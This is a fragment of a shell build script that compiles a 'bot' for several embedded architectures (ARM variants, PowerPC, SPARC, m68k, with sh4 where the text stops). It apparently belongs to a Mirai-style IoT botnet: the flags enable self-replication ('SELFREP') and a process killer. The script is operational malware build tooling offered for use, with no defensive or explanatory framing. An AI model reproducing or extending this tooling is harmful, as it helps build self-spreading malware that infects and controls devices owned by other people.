echo "Building - armv5l"
compile_bot armv5l home.arm5 "-DDEMONS_KILLER -DSELFREP"
echo "Building - armv6l"
compile_bot armv6l home.arm6 "-static -DDEMONS_KILLER -DSELFREP"
echo "Building - armv7l"
compile_bot_arm7 armv7l home.arm7 "-static -DDEMONS_KILLER -DSELFREP"
echo "Building - powerpc"
compile_bot powerpc home.ppc "-static -DDEMONS_KILLER -DSELFREP"
echo "Building - sparc"
compile_bot sparc home.spc "-static -DDEMONS_KILLER -DSELFREP"
echo "Building - m68k"
compile_bot m68k home.m68k "-static -DDEMONS_KILLER -DSELFREP"
echo "Building - sh4"
